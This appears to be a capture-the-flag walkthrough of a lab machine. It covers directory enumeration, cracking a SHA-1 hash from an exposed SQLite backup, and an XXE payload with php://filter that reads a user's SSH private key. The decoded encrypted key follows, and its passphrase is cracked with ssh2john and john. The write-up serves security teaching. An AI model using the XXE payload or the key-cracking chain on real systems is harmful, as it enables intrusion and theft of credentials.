**Directory Bruteforcing**
```bash
python3 dirsearch.py -u http://10.10.159.49

  _|. _ _  _  _  _ _|_    v0.4.2.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11302

Output File: /home/spadille/Tools/dirsearch/reports/10.10.159.49/_22-01-25_09-51-56.txt

Log File: /home/spadille/Tools/dirsearch/logs/last_scan.log

Target: http://10.10.159.49/

[09:51:56] Starting: 
[09:52:06] 403 -  277B  - /.ht_wsr.txt
[09:52:06] 403 -  277B  - /.htaccess.bak1
[09:52:06] 403 -  277B  - /.htaccess.orig
[09:52:06] 403 -  277B  - /.htaccess.sample
[09:52:06] 403 -  277B  - /.htaccess.save
[09:52:06] 403 -  277B  - /.htaccessBAK
[09:52:06] 403 -  277B  - /.htaccessOLD2
[09:52:06] 403 -  277B  - /.htaccess_sc
[09:52:06] 403 -  277B  - /.htaccess_orig
[09:52:06] 403 -  277B  - /.htaccess_extra
[09:52:06] 403 -  277B  - /.html
[09:52:06] 403 -  277B  - /.htaccessOLD
[09:52:06] 403 -  277B  - /.htpasswd_test
[09:52:06] 403 -  277B  - /.htpasswds
[09:52:06] 403 -  277B  - /.httr-oauth
[09:52:07] 403 -  277B  - /.htm
[09:52:09] 403 -  277B  - /.php
[09:52:09] 403 -  277B  - /.php3
[09:52:29] 200 -    3KB - /about.html
[09:52:59] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[09:53:04] 200 -    1KB - /contact.html
[09:53:06] 200 -    1KB - /custom/
[09:53:15] 301 -  312B  - /fonts  ->  http://10.10.159.49/fonts/
[09:53:17] 200 -    2KB - /gallery.html
[09:53:20] 200 -    6KB - /images/
[09:53:20] 301 -  313B  - /images  ->  http://10.10.159.49/images/
[09:53:22] 200 -    2KB - /index.html
[09:56:00] 200 -   28B  - /robots.txt
[09:56:02] 403 -  277B  - /server-status
[09:56:02] 403 -  277B  - /server-status/
```

**Page source** (observe the following lines):
```html
<link rel="stylesheet" type="text/css" href="custom/css/style.css">
	<link rel="stylesheet" type="text/css" href="custom/css/mobile.css" media="screen and (max-width : 568px)">
	<script type="text/javascript" src="custom/js/mobile.js"></script>
```
We observed that we can navigate to `custom` directory.

Now, go to:
```
http://ip_address/custom/js/
```
and download `users.bak`

**users.bak**
```bash
users.bak: SQLite 3.x database, last written using SQLite version 3034001
┌─[spadille@Priya]─[~/Downloads]
└──╼ $sqlite3 users.bak
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users
   ...> ;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

```
So, username is `admin` and password is `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

Let's decrypt password using tool `search-that-hash`
```bash
sth --text "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b"

  _____                     _        _______ _           _          _    _           _
 / ____|                   | |      |__   __| |         | |        | |  | |         | |
| (___   ___  __ _ _ __ ___| |__ ______| |  | |__   __ _| |_ ______| |__| | __ _ ___| |__
 \___ \ / _ \/ _` | '__/ __| '_ \______| |  | '_ \ / _` | __|______|  __  |/ _` / __| '_ \
 ____) |  __/ (_| | | | (__| | | |     | |  | | | | (_| | |_       | |  | | (_| \__ \ | | |
|_____/ \___|\__,_|_|  \___|_| |_|     |_|  |_| |_|\__,_|\__|      |_|  |_|\__,_|___/_| |_|
        
https://twitter.com/bee_sec_san
https://github.com/HashPals/Search-That-Hash
https://twitter.com/Jayy_2004


1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Text : bulldog19
Type : SHA-1
```
So password is `bulldog19`

- Now login to `http://ip_address:8765/` using credentials user=`admin` and password=`bulldog19`

- After login, go to the source code of the page and observe the following comments: 
   first: `//document.cookie = "Example=/auth/dontforget.bak";` and download this file using  `http://ip_address:8765/auth/dontforget.bak`
   and second: `<!-- Barry, you can now SSH in using your key!-->` ; from this comment, we can say that username=`barry` and now we have to find SSH key for Barry.
   
File content:
```xml
cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

- Now, we can say that here `xxe` may exist. Now, let's chexk by using the following payload and submit it in the comment section given at `http://ip_address:8765/home.php`
	Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>&xxe;</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
Now we got id_rsa:
```
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KUHJvYy1UeXBlOiA0LEVOQ1JZUFRFRA0KREVLLUluZm86IEFFUy0xMjgtQ0JDLEQxMzcyNzlENjlBNDNFNzFCQjdGQ0I4N0ZDNjFEMjVFDQoNCmpxREpQK2JsVXIreE1sQVNZQjl0NGdGeU1sOVZ1Z0hRSkF5bEdaRTZKL2Ixbkc1N2VHWU9NOHdkWnZWTUdyZk4NCmJOSlZaWGo2Vmx1Wk1yOXVFWDhZNHZDMmJ0MktDQmlGZzIyNEI2MXo0WEpvaVdRMzVHL2JYczFaR3hYb05JTVUNCk1aZEo3REgxazIyNnFRTXRtNHE5Nk1aS0VRNVpGYTAzMlNvaHRmRFBzb2ltLzdkTmFwRU91alJtdytydUJFNjUNCmwyZjl3WkNmRGFFWnZ4Q1N5UUZESmpCWG0wN21xZlNKM2Q1OWR3aHJHOWR1cnV1MS9hbFVVdkkvak04Yk9TMkQNCldmeWYzbmtZWFd5RDRTUENTVEtjeTRVOVlXMjZMRzdLTUZMY1djRzBEM2w2bDFEd3llVUJabWM4VUF1UUZIN0UNCk5zTnN3Vnlra3IzZ3N3bDJCTVRxR3oxYncvMWdPZENqM0J5YzFMSjZtUldYZkQzSFNtV2NjLzhiSGZkdlZTZ1ENCnVsN0E4Uk9senZyaTcvV0hsY0lBMVNmY3JGYVVqOHZmWGk1M2ZpcDlnQmJMZjZzeU9vMHpESjRWdnczeWNPaWUNClRINmI2bUdGZXhSaVNhRS91M3I1NHZaekwwS0hnWHRhcHpiNGdEbC95UUpvM3dxRDFGZlk3QUMxMmVVYzlOZEMNCnJjdkc4WGNEZytvQlFva0RuR1ZTbkdtbXZtUHhJc1ZUVDMwMjd5a3p3ZWkzV1ZsYWdNQkNPTy9la29ZZU5XbFgNCmJobDFxVHRRNnVDMWtIanlUSFVLTlpWQjc4ZURTYW5rb0VSTHlmY2RhNDlrL2V4SFpZVG1tS0tjZGpOUStLTmsNCjRjcHZsRzlRcDVGaDd1RkNEV29oRS9xRUxwUktaNC9rNkhpQTRGUzEzRDU5Smx2TENLUTZJd09mSVJuc3RZQjgNCjcrWW9Na1BXSHZLam1TL3ZNWCtlbGNaY3ZoNDdLTmRObDRrUXg2NUJTVG1yVVNLOEdnR25xSUp1Mi9HMWZCaysNClQrZ1djZVM1MVdyeElKdWltbWp3dUZEM1MyWFphVlhKU2RLN2l2RDNFOEtmV2pnTXgwelhGdTRNY25DZkFXa2kNCmFoWW1lYWQ2V2lXSHRNOThHL2hRNks2eVBETzdHRGg3Qlp1TWdwTkQvTGJTK3ZwQlBSelhvdENsWEg2UTk5STcNCkxJdVFDTjVoQ2I4WkhGRDA2QStGMmFaTnBnMEc3RnN5VHdUbkFDdFpMWjYxR2R4aE5pKzN0ak9WREdRa1BWVXMNCnBraDlncXY1K21kWjZMVkVxUTMxZVcyemR0Q1VmVXU0V1N6citBbmRIUGEybHF0OTBQK3dIMmlTZDRiTVNzeGcNCmxhWFBYZGNWSnhtd1RzK0tsNTZmUm9tS0Q5WWRQdEQ0VXZ5cjUzQ2g3Q2lpSk5zRkpnNGxZMnM3V2lBbHh4OW8NCnZwSkxHTXRwemhnOEFYSkZWQXR3YVJBRlB4bjU0eTFGSVRYWDZ0aXZrNjJ5RFJqUHNYZnp3Yk1Oc3ZHRmd2UUsNCkRaa2FlSytiQmpYcm11cUQ0RUI5SzU0MFJ1TzZkN2tpd0tOblRWZ1RzcFdsVkNlYk1mTElpNzZTS3R4TFZwbkYNCjZhYWsyaUprTUlROUkwYnVrRE9MWE1PQW9FYW1sS0pUNWcrd1pDQzVhVUk2Y1pHME12MFhLYlNYMkRUbWh5VUYNCmNrUVUvZGNaY3g5VVhvSUZoeDdEZXNxcm9CVFI2ZkVCbHFzbjdPUGxTRmowbEFISENnSXN4UGF3bWx2U20zYnMNCjdiZG9maGxaQmpYWWRJbFpnQkFxZHE1akJKVThHdEZjR3lwaDljYjNmK0MzbmttZURaSkdSSnd4VVllVVM5T2YNCjFkVmtmV1VoSDJ4OWFwV1JWOHBKTS9CeURkMGtOV2EvYy8vTXJHTTArREtrSG9BWktmRGwzc0MwZ2RSQjdrVVENCitaODduRklteHc5NWR4VnZvWlhadm9NU2I3T3ZmMjdBVWhVZWVVOGN0V3NlbEtSbVB3NTYreGhPYkJvQWJSSW4NCjdteE4vTjVMbG9zVGVmSm5saGRJaElEVERNc0V3akFDQStxNjg2K2JSRWQrZHJhamdrNlI5ZUtnU01FN2dlVkQNCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0t
```
This is encoded with base64.

Let's decode this:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```
This is encrypted key. So, we will have to convert this to `John hash` to decrypt it using `ssh2john` tool which is located at `/usr/share/john/ssh2john.py`.

**ssh2john**
```bash
python2.7 /usr/share/john/ssh2john.py id_rsa 
id_rsa:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db05260e25636b3b5a2025c71f68be924b18cb69ce183c017245540b706910053f19f9e32d452135d7ead8af93adb20d18cfb177f3c1b30db2f18582f40a0d991a78af9b0635eb9aea83e0407d2b9e3446e3ba77b922c0a3674d5813b295a554279b31f2c88bbe922adc4b5699c5e9a6a4da226430843d2346ee90338b5cc380a046a694a253e60fb06420b969423a7191b432fd1729b497d834e6872505724414fdd719731f545e8205871ec37acaaba014d1e9f10196ab27ece3e54858f49401c70a022cc4f6b09a5bd29b76ecedb7687e19590635d874895980102a76ae6304953c1ad15c1b2a61f5c6f77fe0b79e499e0d9246449c315187944bd39fd5d5647d65211f6c7d6a959157ca4933f0720ddd243566bf73ffccac6334f832a41e801929f0e5dec0b481d441ee4510f99f3b9c5226c70f7977156fa195d9be83126fb3af7f6ec052151e794f1cb56b1e94a4663f0e7afb184e6c1a006d1227ee6c4dfcde4b968b1379f2679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543
```
This is `John hash`.

Now, decrypt the John hash using `john`
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
1g 0:00:41:29 DONE (2022-01-25 13:29) 0.000401g/s 5761p/s 5761c/s 5761C/s *7¡Vamos!
Session completed
```
So, passphrase for `id_rsa` = `urieljames`
